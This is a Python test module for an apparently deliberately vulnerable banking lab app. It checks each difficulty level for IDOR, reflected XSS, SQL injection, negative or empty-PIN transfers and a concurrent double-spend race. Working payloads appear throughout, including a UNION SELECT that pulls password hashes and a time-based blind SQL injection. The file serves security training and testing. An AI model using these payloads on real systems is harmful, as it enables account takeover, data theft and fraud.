"""Transactions, transfers, history, receipts.

Checks the transaction module across all four levels: history and CSV export
still work, IDOR lets a customer read another account, the search and date
filters are injectable, transfers accept negative and empty-PIN input, and
concurrent transfers break the balance invariant.
"""

import json
import sys
import threading

from harness import (CUSTOMER, LEVELS, csrf, execute, lab, login, parse_levels,
                     rows, run_module, text)

TITLE = "transactions - history, IDOR, SQLi, transfers, race"

# expected value per level, in LEVELS order: easy, medium, hard, patched
EXPECT = {
    "login":                     (302, 302, 302, 302),
    "history_ok":                (True, True, True, True),
    "csv_ok":                    (True, True, True, True),
    "csv_lines":                 (28, 28, 28, 28),
    # IDOR: another customer's account is readable until `patched`
    "idor_history_status":       (200, 200, 200, 403),
    "idor_detail_status":        (200, 200, 200, 403),
    "idor_detail_leaks":         (True, True, True, False),
    "idor_receipt_status":       (200, 200, 200, 403),
    "idor_dashboard_status":     (200, 200, 200, 403),
    "idor_dashboard_leaks":      (True, True, True, False),
    # reflected XSS in the search box
    "xss_unescaped":             (True, True, True, False),
    # SQLi on the keyword filter — closed by the `hard` blacklist
    "sqli_keyword_changed":      (True, True, False, False),
    "sqli_union_leaks_hash":     (True, True, False, False),
    # SQLi on the date filter — still open on `hard` (syntax error + delay)
    "sqli_date_syntax_error":    (True, True, True, False),
    "sqli_date_blind":           (True, True, True, False),
    # input validation on a transfer
    "negative_transfer_status":  (302, 302, 302, 400),
    "negative_transfer_delta":   (50000, 50000, 50000, 0),
    "empty_pin_status":          (302, 302, 400, 400),
    "empty_pin_delta":           (-10000, -10000, 0, 0),
    "normal_transfer_delta":     (-7000, -7000, -7000, -7000),
    "idor_transfer_status":      (302, 302, 302, 403),
    "idor_transfer_victim_delta": (-1000, -1000, -1000, 0),
    "get_transfer_status":       (302, 302, 405, 405),
    # concurrency: easy/medium mint money, hard leaves the account overdrawn
    "race_creates_money":        (True, True, False, False),
    "race_overdrawn":            (False, False, True, False),
    # receipts still render
    "own_detail_status":         (200, 200, 200, 200),
    "own_receipt_status":        (200, 200, 200, 200),
    "receipt_has_print":         (True, True, True, True),
    "receipt_has_ref":           (True, True, True, True),
}


def _total_count(client, params):
    body = text(client.get("/transactions", query_string=params))
    marker = '<div class="card stat">\n        <strong>'
    start = body.find(marker)
    if start == -1:
        return None
    start += len(marker)
    return int(body[start:body.find("<", start)])


def run(level):
    out = {}
    with lab(level) as (app, db_path, _uploads, _tmp):
        client = app.test_client()
        out["login"] = login(client).status_code

        me = rows(db_path, "SELECT id FROM users WHERE username=?", (CUSTOMER[0],))[0]["id"]
        mine = rows(db_path, "SELECT * FROM accounts WHERE user_id=? ORDER BY id", (me,))
        src = mine[0]
        victim = rows(db_path, "SELECT * FROM accounts WHERE user_id != ? ORDER BY id",
                      (me,))[0]

        out["history_ok"] = client.get("/transactions").status_code == 200

        export = client.get("/transactions/export.csv")
        out["csv_ok"] = export.status_code == 200 and export.mimetype == "text/csv"
        out["csv_lines"] = text(export).count("\n")

        # --- IDOR on another account's history / detail / receipt ----------
        out["idor_history_status"] = client.get(
            f"/transactions?account_id={victim['id']}").status_code
        victim_tx = rows(db_path,
                         "SELECT id, description FROM transactions WHERE account_id=? "
                         "ORDER BY id LIMIT 1", (victim["id"],))[0]
        detail = client.get(f"/transactions/{victim_tx['id']}")
        out["idor_detail_status"] = detail.status_code
        out["idor_detail_leaks"] = bool(victim_tx["description"]) and \
            victim_tx["description"].encode() in detail.data
        out["idor_receipt_status"] = client.get(
            f"/transactions/{victim_tx['id']}/receipt").status_code

        dash = client.get(f"/dashboard?account_id={victim['id']}")
        latest = rows(db_path,
                      "SELECT description FROM transactions WHERE account_id=? "
                      "ORDER BY created_at DESC, id DESC LIMIT 1", (victim["id"],))[0]
        out["idor_dashboard_status"] = dash.status_code
        out["idor_dashboard_leaks"] = bool(latest["description"]) and \
            latest["description"].encode() in dash.data

        # --- reflected XSS in the search box -------------------------------
        payload = "<script>alert(1)</script>"
        out["xss_unescaped"] = payload.encode() in client.get(
            "/transactions", query_string={"q": payload}).data

        # --- SQLi: keyword filter (tautology + UNION) ----------------------
        baseline = _total_count(client, {"q": "zzz-no-such-row"})
        injected = _total_count(client, {"q": "' OR '1'='1"})
        out["sqli_keyword_changed"] = baseline != injected and injected is not None
        union_q = ("x%' OR 1=1) UNION SELECT 1,'REF',1,1,'IN','transfer',1,'CP',"
                   "'1234567890',password_hash,'cat','success',1,"
                   "'2024-01-01 00:00:00','1000000000' FROM users -- ")
        union = client.get("/transactions", query_string={"q": union_q}).data
        out["sqli_union_leaks_hash"] = b"md5:" in union or b"$2b$" in union

        # --- SQLi: date filter (syntax error + time-based blindness) -------
        out["sqli_date_syntax_error"] = client.get(
            "/transactions", query_string={"start": "2020-01-01'"}).status_code >= 500

        import time
        started = time.time()
        client.get("/transactions",
                   query_string={"start": "2024-01-01' AND 1=(WITH RECURSIVE c(x) AS "
                                           "(SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<4000000) "
                                           "SELECT count(*) FROM c) AND '1'='1"})
        out["sqli_date_blind"] = (time.time() - started) >= 0.15

        token = csrf(client, "/transfer")

        def transfer(**fields):
            before = rows(db_path, "SELECT balance FROM accounts WHERE id=?",
                          (src["id"],))[0]["balance"]
            resp = client.post("/transfer", data={"csrf_token": token, **fields},
                               follow_redirects=False)
            after = rows(db_path, "SELECT balance FROM accounts WHERE id=?",
                         (src["id"],))[0]["balance"]
            return resp.status_code, after - before

        status, delta = transfer(account_id=src["id"], amount="-50000",
                                 dest_account=victim["account_number"],
                                 description="neg", pin="123456")
        out["negative_transfer_status"], out["negative_transfer_delta"] = status, delta

        status, delta = transfer(account_id=src["id"], amount="10000",
                                 dest_account=victim["account_number"],
                                 description="empty pin", pin="")
        out["empty_pin_status"], out["empty_pin_delta"] = status, delta

        _status, delta = transfer(account_id=src["id"], amount="7000",
                                  dest_account=victim["account_number"],
                                  description="normal", pin="123456")
        out["normal_transfer_delta"] = delta

        # --- IDOR: debit someone else's account ----------------------------
        before_v = rows(db_path, "SELECT balance FROM accounts WHERE id=?",
                        (victim["id"],))[0]["balance"]
        status = client.post("/transfer", data={
            "csrf_token": token, "account_id": victim["id"],
            "dest_account": src["account_number"], "amount": "1000",
            "description": "idor", "pin": "123456"},
            follow_redirects=False).status_code
        after_v = rows(db_path, "SELECT balance FROM accounts WHERE id=?",
                       (victim["id"],))[0]["balance"]
        out["idor_transfer_status"] = status
        out["idor_transfer_victim_delta"] = after_v - before_v

        # --- method tampering: GET transfer --------------------------------
        out["get_transfer_status"] = client.get("/transfer/quick", query_string={
            "account_id": src["id"], "dest_account": victim["account_number"],
            "amount": "1000", "description": "get"}).status_code

        # --- concurrent double spend ---------------------------------------
        execute(db_path, "UPDATE accounts SET balance = 100000 WHERE id = ?", (src["id"],))
        donors = rows(db_path,
                      "SELECT id, account_number FROM accounts "
                      "WHERE id != ? AND user_id != ? ORDER BY id LIMIT 6",
                      (src["id"], me))
        dest_before = {d["id"]: rows(db_path, "SELECT balance FROM accounts WHERE id=?",
                                     (d["id"],))[0]["balance"] for d in donors}

        def fire(dest_account):
            thread_client = app.test_client()
            login(thread_client)
            thread_client.post("/transfer", data={
                "csrf_token": csrf(thread_client, "/transfer"),
                "account_id": src["id"], "dest_account": dest_account,
                "amount": "80000", "description": "race", "pin": "123456"},
                follow_redirects=False)

        threads = [threading.Thread(target=fire, args=(d["account_number"],))
                   for d in donors]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        final = rows(db_path, "SELECT balance FROM accounts WHERE id=?",
                     (src["id"],))[0]["balance"]
        gained = sum(rows(db_path, "SELECT balance FROM accounts WHERE id=?",
                          (d["id"],))[0]["balance"] - dest_before[d["id"]]
                     for d in donors)
        out["race_creates_money"] = (final + gained - 100000) > 0
        out["race_overdrawn"] = final < 0

        # --- own detail + receipt ------------------------------------------
        own_tx = rows(db_path, "SELECT id FROM transactions WHERE account_id=? ORDER BY id",
                      (src["id"],))[0]["id"]
        out["own_detail_status"] = client.get(f"/transactions/{own_tx}").status_code
        receipt = client.get(f"/transactions/{own_tx}/receipt")
        out["own_receipt_status"] = receipt.status_code
        out["receipt_has_print"] = b"data-print" in receipt.data
        out["receipt_has_ref"] = b"TRX-" in receipt.data
    return out


if __name__ == "__main__":
    sys.exit(run_module(TITLE, run, EXPECT, parse_levels()))
